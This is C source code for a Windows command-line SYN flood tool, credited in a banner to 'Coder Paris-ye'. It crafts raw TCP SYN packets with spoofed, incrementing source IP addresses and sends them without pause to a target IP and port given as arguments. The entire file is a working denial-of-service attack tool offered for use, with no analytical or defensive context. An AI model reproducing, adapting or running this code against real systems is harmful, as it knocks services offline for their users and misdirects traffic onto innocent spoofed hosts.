#include <winsock2.h>
#include <Ws2tcpip.h> 
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32")
#pragma comment(lib,"wsock32")
#define FAKE_IP "201.79.131.18" 
#define SEQ 0x28376839
#define right "===============Coder Paris-ye====================\n"
USHORT checksum(USHORT *buffer, int size);
int flood();

typedef struct tcphdr
{
	USHORT th_sport;
	USHORT th_dport;
	unsigned int th_seq;
	unsigned int th_ack;
	unsigned char th_lenres;
	unsigned char th_flag;
	USHORT th_win;
	USHORT th_sum;
	USHORT th_urp;
}TCP_HEADER; 

typedef struct iphdr
{
	unsigned char h_verlen;
	unsigned char tos;
	unsigned short total_len;
	unsigned short ident;
	unsigned short frag_and_flags;
	unsigned char  ttl;
	unsigned char proto;
	unsigned short checksum;
	unsigned int sourceIP;
	unsigned int destIP;
}IP_HEADER;

struct
{
	unsigned long saddr;
	unsigned long daddr;
	char mbz;
	char ptcl;
	unsigned short tcpl;
}PSD_HEADER; 

WSADATA wsaData;
SOCKET  sockMain = (SOCKET) NULL;
int ErrorCode=0,flag=true,TimeOut=2000,FakeIpNet,FakeIpHost,dataSize=0,SendSEQ=0;
unsigned short activPort=40000;
struct sockaddr_in sockAddr;
TCP_HEADER  tcpheader;
IP_HEADER   ipheader;
char        sendBuf[128];

USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum=0;
	while(size >1) {
		cksum+=*buffer++;
		size-=sizeof(USHORT);
	}
	if(size) cksum+=*(UCHAR*)buffer;
	cksum=(cksum >> 16)+(cksum&0xffff);
	cksum+=(cksum >>16);
	return (USHORT)(~cksum); 
}


int main(int argc,char* argv[])
{
	int    portNum=0;
	DWORD  dw;
	HANDLE hThread=NULL;
	char   putInfo;

	if(argc!=3)
	{
		printf("%s\n",right);
		printf("Invalid command,Pls use:\n%s  <IP> <port>\nExample:%s 192.168.100.244 80",argv[0],argv[0]);
		return 1;
	}
	if((ErrorCode=WSAStartup(MAKEWORD(2,1),&wsaData))!=0){
	        printf("WSAStartup failed: %d\n",ErrorCode); 
	        return 2;
	}
	sockMain=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);
	if(sockMain==INVALID_SOCKET)
	{
		printf("Socket failed: %d\n",WSAGetLastError());
	return 3;
	}
	ErrorCode=setsockopt(sockMain,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(int));
	if(ErrorCode==SOCKET_ERROR)
	{
	        printf("Set sockopt failed: %d\n",WSAGetLastError());
		return 4;
	}
	ErrorCode=setsockopt(sockMain,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut));
	if(ErrorCode==SOCKET_ERROR)
	{
	        printf("Set sockopt time out failed: %d\n",WSAGetLastError());
	return 5;
	}
	portNum=atoi(argv[2]);

	memset(&sockAddr,0,sizeof(sockAddr));
	sockAddr.sin_family=AF_INET;
	sockAddr.sin_addr.s_addr =inet_addr(argv[1]);
	FakeIpNet=inet_addr(FAKE_IP);
	FakeIpHost=ntohl(FakeIpNet);

	ipheader.h_verlen=(4<<4 | sizeof(IP_HEADER)/sizeof(unsigned long));
	ipheader.total_len = htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER));
	ipheader.ident = 1;
	ipheader.frag_and_flags = 0;
	ipheader.ttl = 128;
	ipheader.proto = IPPROTO_TCP;
	ipheader.checksum =0;
	ipheader.sourceIP = htonl(FakeIpHost+SendSEQ);
	ipheader.destIP = inet_addr(argv[1]);

	tcpheader.th_dport=htons(portNum);
	tcpheader.th_sport = htons(portNum);
	tcpheader.th_seq = htonl(SEQ+SendSEQ);
	tcpheader.th_ack = 0;
	tcpheader.th_lenres =(sizeof(TCP_HEADER)/4<<4|0);
	tcpheader.th_flag = 2;
	tcpheader.th_win = htons(16384);
	tcpheader.th_urp = 0;
	tcpheader.th_sum = 0;

	PSD_HEADER.saddr=ipheader.sourceIP;
	PSD_HEADER.daddr=ipheader.destIP;
	PSD_HEADER.mbz=0; 
	PSD_HEADER.ptcl=IPPROTO_TCP;
	PSD_HEADER.tcpl=htons(sizeof(tcpheader));
	printf("%s\n",right);
	hThread=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)flood,0,CREATE_SUSPENDED,&dw);
	SetThreadPriority(hThread,THREAD_PRIORITY_HIGHEST);
	ResumeThread(hThread);
	printf("Warning[start]...........\nPress any key to stop!\n");
	putInfo=getchar();
	TerminateThread(hThread,0);
	WSACleanup();
	printf("\nStopd...........\n");

	return 0;
}

int flood()
{
	while(1)
	{
		if(SendSEQ++==65536) SendSEQ=1;
		if(activPort++==40010) activPort=1000;
		ipheader.checksum =0;
		ipheader.sourceIP = htonl(FakeIpHost+SendSEQ);
		tcpheader.th_seq = htonl(SEQ+SendSEQ);
		tcpheader.th_sport = htons(activPort);
		tcpheader.th_sum = 0;
		PSD_HEADER.saddr=ipheader.sourceIP;
		memcpy(sendBuf,&PSD_HEADER,sizeof(PSD_HEADER));
		memcpy(sendBuf+sizeof(PSD_HEADER),&tcpheader,sizeof(tcpheader));
		tcpheader.th_sum=checksum((USHORT *)sendBuf,sizeof(PSD_HEADER)+sizeof(tcpheader));

		memcpy(sendBuf,&ipheader,sizeof(ipheader));
		memcpy(sendBuf+sizeof(ipheader),&tcpheader,sizeof(tcpheader));
		memset(sendBuf+sizeof(ipheader)+sizeof(tcpheader),0,4);
		dataSize=sizeof(ipheader)+sizeof(tcpheader);
		ipheader.checksum=checksum((USHORT *)sendBuf,dataSize);
		memcpy(sendBuf,&ipheader,sizeof(ipheader));
		ErrorCode=sendto(sockMain,sendBuf,dataSize,0,(struct sockaddr*) &sockAddr,sizeof(sockAddr));
		if(ErrorCode==SOCKET_ERROR)
		{
			printf("\nCan't connect this IP!Pls check it.\n");
			ExitThread(1);
		}
		// Sleep(1000);
	}
	return 0;
}